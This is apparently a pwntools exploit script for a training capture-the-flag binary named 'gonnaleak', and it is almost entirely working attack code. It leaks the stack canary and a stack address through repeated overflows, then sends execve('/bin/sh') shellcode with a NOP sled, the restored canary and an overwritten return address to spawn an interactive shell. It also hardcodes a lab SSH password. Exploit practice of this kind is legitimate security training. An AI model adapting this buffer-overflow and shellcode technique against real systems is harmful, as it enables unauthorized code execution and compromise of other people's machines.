import pwn
from pwn import *
from getpass import *
import logging
import time
#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.arch = 'amd64'
if len(sys.argv)==1:
    #REMOTE EXPLOIT
    site = "training.jinblack.it"
    port = 2011
    r =  remote(site,port)
    process = "./gonnaleak"

else:
    script_name, debug = sys.argv

    #SSH EXPLOIT : PLEASE NOTE IT IS NOT POSSIBLE TO USE GDB.DEBUG THROUGH SSH USE GDB.ATTACH
    host = "acidburn"

    ip = "127.0.0.1"

    category = "mitigations"
    proc = "gonnaleak"
    #path = "/challenges/rop/ropasaurusrex/"
    path = "/challenges/"+category+"/"+proc+"/"
    #prt = int(input(" insert "+host+"'s port to connect to:"))
    prt = 3022

    #pwd = getpass("insert "+host+"'s password:")
    pwd = "acidburn"

    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)

    process = "."+path+proc

    gdbc = '''
               b *0x400be7
               b *0x400c0e
               continue
               b *0x400c14
               b *0x400416
           '''
    #c = ssh_p.process(process)
    #r= gdb.attach(c,gdbscript ='''b *0x400c14
    #
    #c = ssh_p.process(process)
    print(sys.argv)
    if ( debug == 'gdb') :
        r = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
    else:
        r = ssh_p.process(process)
# r = pwn.process('./gonnaleak')

# breakpoint_addr = 'b *0x401224'

# pwn.gdb.attach(r, """
#     b *0x401224
#     c

# """)

input('wait')

shell_code = pwn.asm('''
    jmp end
    start:
    pop rdi
    mov rax, 0x3b
    lea rsi, [rdi + 0x7]
    mov rdx, rsi
    syscall
    end:
    call start
''') + b'/bin/sh' + b'\x00' * 8

## calculates the string length
buffer_len = 104
# fills
filler_until_canary = b'A' * (buffer_len + 1)
## I send it
r.send(filler_until_canary)
## then I receive it
r.recvuntil(b'> ')
## until I get this
r.recv(len(filler_until_canary))
##then I get the canary
canary = b'\x00' + r.recv(7)

r.clean() # flush stdout

print('This is the canary')
print(pwn.binascii.hexlify(canary))
##now that I have the canary what do I do ?
leak = b''
##Another cycle of the while begins
ADDRESS_SIZE = 8
##This offset must be recovered from gdb
buffer_base_to_leak = 0x88 # amount of characters until start of leak

offset_from_leak = 0x158 - 0x10 # offset from base buffer address to the leaked address

while len(leak) < ADDRESS_SIZE:
    ## I fill until the leak
    print( "I'm printing this amount of stuff")
    print(len(leak))
    print(int(buffer_base_to_leak))
    filler_until_leak_zero = b'A' * (buffer_base_to_leak + len(leak))
    r.send(filler_until_leak_zero)
    r.recvuntil(b'> ')
    r.recv(len(filler_until_leak_zero))# I receive everything I wanted to have till the leak
    missing_bytes = r.recv(ADDRESS_SIZE - len(leak), timeout=0.01)
    if len(missing_bytes) != 0:
        leak += missing_bytes
    else:
        leak += b'\x00'
    print("I'm printing the first leak")
    print(pwn.binascii.hexlify(leak))
    print(len(leak))


print('final leak:')
print(pwn.binascii.hexlify(leak))
print(len(leak))

buffer_addr = pwn.u64(leak) - offset_from_leak

print('sending exploit')

r.send((shell_code).rjust(buffer_len, b'\x90') + canary + b'\x90' * 8 + pwn.p64(buffer_addr))

r.interactive()
